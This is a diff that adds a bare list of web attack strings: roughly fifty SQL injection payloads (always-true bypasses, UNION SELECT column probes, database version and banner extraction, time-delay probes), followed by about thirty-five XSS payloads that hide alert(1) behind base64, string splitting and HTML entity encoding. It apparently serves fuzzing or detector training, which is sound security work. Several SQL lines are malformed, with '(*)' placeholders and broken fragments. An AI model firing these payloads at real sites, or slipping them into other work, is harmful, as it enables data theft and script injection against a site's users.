@@ -1,0 +1,86 @@
+1' or ' ( 1' or 1 = 1 -- 1
+1  )  )   )  and 2853 = cast  (*) ||chr (*) ||chr (*) ||chr (*) ||chr (*)  )  || (*)  then 1 else 0 end  )  )  ::text|| (*) ||chr (*) ||chr (*) ||chr (*) ||chr (*)  )   as numeric )  and   (  (  5281 = 5281,1 -- 1
+4571 = 4571 ' union all select 4571,4571,4571,4571,4571#,1 -- 1
+1' or '1' = '1 -- 1
+1' or ',1' or 1 = 1 -- 1
+4885 = 4885 ' union all select null,null,null,null,null,null#,1 -- 1
+1' or '1' = '1,1 -- 1
+1' or '1' or 1 = 1 -- 1
+1' or ' ( 1' or 1 = 1 -- 1
+-9880' union all select 1995,1995,1995,1995,1995,1995,1995,1995,1995#,1 -- 1
+1' or 1#'{ ' union select 'a',version (*)  --
+1' or 1#'; ' union select null,version (*)  --
+1 )  where 2169 = 2169 and 2388 = benchmark (*)  )  #,1 -- 1
+6856 = 6856 ' union all select null,null,null,null,null,null,null#,1 -- 1
+4889 = 4889 ' union all select 4889,4889,4889,4889#,1 -- 1
+1' union all select null,null,null,null,null,null,null,null#,1 -- 1
+1' union all select null,null,null,null,null,null#,1 -- 1
+1' or 1#'. ' union select 'a',version (*)  -- 1
+1' or ';_' or 1 = 1 -- 1
+6261 = 6261 ' union all select null,null,null,null,null,null#,1 -- 1
+1' or ' ) @' or 1 = 1 -- 1
+4161 = 4161 ' union all select 4161,4161,4161,4161,4161,4161,4161,4161,4161#,1 -- 1
+2111 = 2111 ' union all select null,null,null,null#,1 -- 1
+1' union select null,@@VERSION --
+1' or ' ( {' or 1 = 1 -- 1
+1' or '1' or 1 = 1 -- 1
+1%' union all select null,null,null,null,null,null,null#,1 -- 1
+1' or 1#'; ' union select 'a',version (*)  -- 1
+1' or 1#'$ ' union select null,version (*)  --
+1 ' union select null,banner from v$version where' rownumnum = 1 -- 1
+1 and sleep (*) # qcyj,1 -- 1
+1  )  )   )  and 2388 = benchmark (*)  )   and   (  (   ( 6556 = 6556,1 -- 1
+1' or '1' = '1,1 -- 1
+1' or '1' = 1 or 1 = 1 -- 1
+1' or '{,' = 1 or 1 = 1 -- 1
+3877 = 3877 ' union all select 3877,3877,3877,3877,3877,3877,3877#,1 -- 1
+1' or '1' = '1 or 1 = 1 -- 1
+1' or ' ( [' or 1 = 1 -- 1
+1' union all select null,null,null,null,null,null#,1 -- 1
+1' or ' ) @' or 1 = 1 -- 1
+1  )  )   )  ' union select null,banner from v$version where' rownumnum = 1 -- 1
+1' or '1#' or 1 = 1 -- 1
+1  )  )   )  and 2388 = benchmark (*)  )  #,1 -- 1
+1' union all select null,banner from v$version where' rownumnum = 1 --
+1' or ',{' or 1 = 1 -- 1
+1' union select 1,banner from v$version where rownum = 1 -- 1
+1' or '1' or 1 = 1 -- 1
+2182 = 2182 ' union all select 2182,2182,2182,2182#,1 -- 1
+1' or ' ) [' or 1 = 1 -- 1
+1' or ' ( @' or 1 = 1 -- 1
+<svg onload=eval(atob`YWxlcnQoMSk`)>
+<svg onload=eval(atob`YWxlcnQoMSk`)>
+<iframe srcdoc='<script>parent.alert(1)</script>'>
+<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>
+<svg onload=eval(atob`YWxlcnQoMSk`)>
+<details open ontoggle=eval(atob`YWxlcnQoMSk`)>
+<details open ontoggle=top['al'+'ert']`1`>
+<iframe srcdoc="&lt;script&gt;parent[&#x61;&#x6c;&#x65;&#x72;&#x74;](1)&lt;/script&gt;">
+<iframe srcdoc="&#60;img src=x onerror=top['al'+'ert']`1`>&#62;">
+<details ontoggle=eval(atob`YWxlcnQoMSk`)>
+<svg onload=eval(atob`YWxlcnQoMSk`)>
+<svg onload=eval(atob`YWxlcnQoMSk`)>
+<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>
+<iframe srcdoc="&lt;img src=x onerror=eval(atob`YWxlcnQoMSk`)&gt;">
+<iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;">
+<details ontoggle=top['al'+'ert']`1` open>
+<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>
+<svg onload=eval(atob`YWxlcnQoMSk`)>
+<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>
+<svg onload=eval(atob`YWxlcnQoMSk`)>
+<iframe srcdoc='<script>parent[`al`+`ert`](1)</script>'>
+<details ontoggle="top['al'+'ert']`1`"><summary>x</summary>
+<details ontoggle=top['al'+'ert']`1` open>
+<iframe srcdoc='<script>parent[&#x27;al&#x27;+&#x27;ert&#x27;](1)</script>'>
+<svg onload=eval(atob`YWxlcnQoMSk`)>
+<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>
+<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>
+<iframe srcdoc='&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;'></iframe>
+<iframe srcdoc='<script>parent[&#x27;al&#x27;+&#x27;ert&#x27;+&#x27;(&#x27;1&#x27;)&#x27;+&#x27;]&#x27;()&#x27;</script>'>
+<iframe srcdoc='<script>parent.alert(1)</script>'>
+<svg onload=eval(atob`YWxlcnQoMSk`)>
+<details ontoggle="top['al'+'ert']`1`"><summary>x</summary>
+<details open ontoggle=eval(atob`YWxlcnQoMSk`)>
+<details ontoggle=eval(atob`YWxlcnQoMSk`)>
+<iframe srcdoc='<svg onload=eval(atob`YWxlcnQoMSk`)>`.
+<iframe srcdoc='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'>
